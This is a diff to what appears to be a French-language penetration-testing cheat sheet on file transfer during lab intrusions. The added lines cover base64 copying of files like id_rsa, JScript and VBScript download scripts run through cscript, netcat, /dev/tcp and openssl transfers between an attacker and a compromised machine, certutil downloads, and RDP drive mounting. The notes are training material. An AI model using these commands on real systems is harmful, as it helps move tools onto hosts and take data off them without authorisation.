@@ -11,6 +11,15 @@
 ###### Powershell :
 
 ```powershell
+###### base64 method : 
+# encode file in base64
+cat <FileName> |base64 -w 0;echo 
+# decode 
+echo -n "<Base64>" | base64 -d > <FileName>
+# decode 
+[IO.File]::WriteAllBytes("<C:\Users\Public\id_rsa | NewPath>", [Convert]::FromBase64String("<Base64>"))
+
+
 # file downlod method
 (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
 # file download method 2
@@ -157,8 +166,12 @@ sudo systemctl enable ssh
 
 # commencer
 sudo systemctl start ssh
-# se connecter avec scp
+# se connecter avec scp + download file
 scp <Username>@<IP>:/<FilePath> .
+
+
+# unzip file
+ gunzip -S .zip  <Decompress_FileName>
 ``` 
 
 * ssh : SCP Upload 
@@ -223,9 +236,37 @@ ruby -e 'require "net/http"; File.write("<OUTPUT>", Net::HTTP.get(URI.parse("<UR
 #Perl
 perl -e 'use LWP::Simple; getstore("<URL>", "<OUTPUT>");'
 
-# use ( VBScript or Js ) + cscript 
+# use ( VBScript or Js ) + cscript to download file  
+cscript.exe /nologo <wget.js | wget.vbs > <URL> <OutputName>
 ```
 
+* js 
+    ```javascript
+    # wget.js
+    var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
+    WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
+    WinHttpReq.Send();
+    BinStream = new ActiveXObject("ADODB.Stream");
+    BinStream.Type = 1;
+    BinStream.Open();
+    BinStream.Write(WinHttpReq.ResponseBody);
+    BinStream.SaveToFile(WScript.Arguments(1));
+    ```
+* vbs
+    ```vbs
+    # wget.vbs
+    dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
+    dim bStrm: Set bStrm = createobject("Adodb.Stream")
+    xHttp.Open "GET", WScript.Arguments.Item(0), False
+    xHttp.Send
+
+    with bStrm
+        .type = 1
+        .open
+        .write xHttp.responseBody
+        .savetofile WScript.Arguments.Item(1), 2
+    end with
+    ```
 
 ###### Upload file 
 ```bash
@@ -242,13 +283,20 @@ python3 -c 'import requests;requests.post("http://<IP>:<PORT>/upload",files={"fi
 
 ###### Netcat
 ```bash
-# listenner
+# listenner ( target )
 nc -l -p <Port> > <Filename>
 # specifier --recv-only : pour fermer la connexion une fois le fichier transmis 
 
-# sender
+# sender ( attaquant )
 nc -v -w 2 -u <RecieverIp> -p <Port> < <Filename>
 # specifier : (-q 0 | --send-only ) : pour fermer la connexion une fois le fichier transmis
+
+### cas 2 : attaquant in listenning with file as input
+# listener ( Attaquant machine )
+sudo nc -l -p <Port> -q 0 < <FileName>
+# reciever ( target machine )
+nc <Attaquant-IP> <Port> > <FileName>
+
 
 # alternative listenner
 cat < /dev/tcp/<AttaquantIP/<Port> > <FileName>
@@ -273,6 +321,17 @@ Invoke-WebRequest http://<IP>/nc.exe -UserAgent [Microsoft.PowerShell.Commands.P
 # use other binary
 #Transferring File with GfxDownloadWrapper.exe
 GfxDownloadWrapper.exe "http://<FileToDownloadPath>" "C:\<OutPutPath>"
+# transfert with open ssl
+    ## certificate creation
+    openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
+    ## stand server in attacker machine 
+    openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem <  <FilePath>
+    ## compromised machine
+    openssl s_client -connect 10.10.10.32:80 -quiet > <FileNameOutput>
+
+# download file with certutil (wget )
+# windows
+ certutil.exe -verifyctl -split -f http://<IP>/<FileName>
 ```
 
 ###### Powershell Session
@@ -298,17 +357,23 @@ Copy-Item -Path C:\<File¨Path> -ToSession $Session -Destination C:\<NewPath>
 
 * Windows : **mstsc.exe**
 
-* Linux : **xfreerdp , rdesktop**
+* Linux : **xfreerdp , rdesktop**, xrdp, remmina
 ```bash
-
+# linux
 # mount server using rdesktop
-rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
+rdesktop 10.10.10.132 -d HTB -u <Username> -p '<Password>' -r disk:linux='/home/user/rdesktop/files'
 
 #using xfreerdp
-xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
+xfreerdp /v:10.10.10.132 /d:HTB /u:<Username> /p:'<Password>' /drive:linux,/home/plaintext/htb/academy/filetransfer
 
 # how to connect : use :
 \\tsclient\
+
+# connect to rdp
+sudo apt-get install rdesktop
+rdesktop -u <Username> <Target-IP>
+#alternative
+xfreerdp /u:<Username> /p:"<Password>" /v:<Target-IP>
 ```
 
 
@@ -333,3 +398,42 @@ openssl enc -aes256 -iter 100000 -pbkdf2 -in <FileNameToEncrypt> -out <NewName>.
 openssl enc -d -aes256 -iter 100000 -pbkdf2 -in <EncryptedName> -out <DecryptedName>
 ```
 
+---
+
+## 
+
+```bash
+# Create a Directory to Handle Uploaded Files
+sudo mkdir -p /var/www/uploads/SecretUploadDirectory
+
+# Change the Owner to www-data
+sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory
+
+# Create Nginx Configuration File
+# modify : /etc/nginx/sites-available/upload.conf
+server {
+    listen 9001;
+    
+    location /SecretUploadDirectory/ {
+        root    /var/www/uploads;
+        dav_methods PUT;
+    }
+}
+
+# Symlink our Site to the sites-enabled Directory
+sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/
+
+# start server 
+sudo systemctl restart nginx.service
+
+# verify errors
+tail -2 `/var/log/nginx/error.log`
+ss -lnpt | grep `80`
+ps -ef | grep `<PID>`
+
+# remove config 
+ sudo rm /etc/nginx/sites-enabled/default
+
+# upload file 
+curl -T <FileName> http://localhost:9001/SecretUploadDirectory/users.txt
+```
